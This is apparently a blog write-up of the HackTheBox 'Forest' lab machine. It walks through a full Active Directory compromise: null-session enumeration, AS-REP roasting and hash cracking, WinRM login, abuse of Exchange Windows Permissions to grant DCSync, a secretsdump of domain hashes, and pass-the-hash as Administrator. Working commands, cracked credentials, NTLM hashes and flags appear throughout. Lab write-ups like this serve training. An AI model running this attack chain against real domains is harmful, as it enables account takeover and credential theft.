---
title: "Forest"
date: 2025-05-08
categories:
  - HackTheBox
  - Active Directory
tags:
  - HackTheBox
  - Active Directory
---

# Forest

![](../assets/Pasted%20image%2020250508201418.png)
<!-- more -->

## Enumeration

```shell
$ nmap -A -T4 --min-rate 5000 -p- -n -Pn --open 10.10.10.161
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 20:26 CEST
Nmap scan report for 10.10.10.161
Host is up (0.042s latency).
Not shown: 65326 closed tcp ports (reset), 185 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2025-05-08 18:33:14Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49671/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49704/tcp open  msrpc        Microsoft Windows RPC
49958/tcp open  msrpc        Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2016
OS CPE: cpe:/o:microsoft:windows_server_2016
OS details: Microsoft Windows Server 2016
Network Distance: 2 hops
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2025-05-08T11:34:07-07:00
| smb2-time: 
|   date: 2025-05-08T18:34:10
|_  start_date: 2025-05-08T18:21:52
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m47s, deviation: 4h02m30s, median: 6m46s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

Enum users with `rpc` null session

```shell
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

## Initial Access

Trying AS-REP roasting attack, we find a user with "Do not require Kerberos preauthentication".

```shell
$ impacket-GetNPUsers htb/ -dc-ip 10.10.10.161 -request -no-pass -usersfile users                           
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
...
$krb5asrep$23$svc-alfresco@HTB:afacf1d07030d4fb9e9372d9e12c7028$abc439862e61f38c77f55f23762693538774e0636741f928507b6de782cd42b470ae6e4ad8386b7bf3425c79e911fe718371863643dd3fdb595ab8c4b4564333f192a6d0af86943fb03ef94316502e7dc781ab0d8af0c66be58f4247a350af427d6e235cacddefb995eee90550cbdcf59de86f6a09e5d7c723c409073e4f1d0651f66841f342770c960fcc8dd3b62e2fbb3d2603a8ce98b1c55f6527b1bc6c2d28bda6b88207430589af5bdc095ea1ec638741d199cdca30523f28d70c2572229260b29b9b64628f713d7fc0b36cdb168beb83f1dde9261d9aab241068b81208
```

With `hashcat`:

```shell
$ hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.6) starting

$krb5asrep$23$svc-alfresco@HTB:afacf1d07030d4fb9e9372d9e12c7028$abc439862e61f38c77f55f23762693538774e0636741f928507b6de782cd42b470ae6e4ad8386b7bf3425c79e911fe718371863643dd3fdb595ab8c4b4564333f192a6d0af86943fb03ef94316502e7dc781ab0d8af0c66be58f4247a350af427d6e235cacddefb995eee90550cbdcf59de86f6a09e5d7c723c409073e4f1d0651f66841f342770c960fcc8dd3b62e2fbb3d2603a8ce98b1c55f6527b1bc6c2d28bda6b88207430589af5bdc095ea1ec638741d199cdca30523f28d70c2572229260b29b9b64628f713d7fc0b36cdb168beb83f1dde9261d9aab241068b81208:s3rvice
```

`svc-alfresco:s3rvice`

Checking with `nxc`, we can `winrm`

```shell
$ nxc winrm 10.10.10.161 -u svc-alfresco -p s3rvice
WINRM       10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

```shell
$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice                         
                                        
Evil-WinRM shell v3.7
                                        
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> whoami
htb\svc-alfresco
```

Get the flag

```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\desktop> cat user.txt
d1a91c765e7cb29e7525611d1e741dac
```

## Privilege Escalation

```shell
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
BUILTIN\Account Operators                  Alias            S-1-5-32-548                                  Mandatory group, Enabled by default, Enabled group
```

The account `svc-alfresco` is a member of Account Operators. This group can change users that don't belong to protected groups with high privileges, but we can find a useful group.

Let's scout the AD with `bloodhound-python` to identify a target.

```shell
$ bloodhound-python -c All -u svc-alfresco -p s3rvice -d htb.local -dc forest.htb.local -ns 10.10.10.161 --zip
```

There is a group called `Exchange Windows Permissions` that has `WriteDacl` to the domain, so we can add `svc-alfresco` to that group.

![](../assets/Pasted%20image%2020250508231235.png)

First, add the user to the group.

```shell
*Evil-WinRM* PS C:\users\svc-alfresco> Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members svc-alfresco
```

Now, using `impacket-dacledit`, give the user DCSync permissions over the domain.

```shell
$ impacket-dacledit htb.local/svc-alfresco:s3rvice -action write -rights DCSync -principal svc-alfresco -target-dn 'DC=htb,DC=local' -dc-ip 10.10.10.161
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] DACL backed up to dacledit-20250508-234706.bak
[*] DACL modified successfully!
```

Now, using `secretsdump`, get the hashes.

```shell
$ impacket-secretsdump htb.local/svc-alfresco:s3rvice@10.10.10.161
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
```

Lastly, using the admin's hash, enter the DC via `evil-winrm`.

```shell
$ evil-winrm -i 10.10.10.161 -u administrator -H 32693b11e6aa90eb43d32c72a07ceea6
Evil-WinRM shell v3.7 
                     
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
htb\administrator
```

## Post Exploitation

Get the flag

```shell
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
d76116e190c267673c6384c5805c8853
```
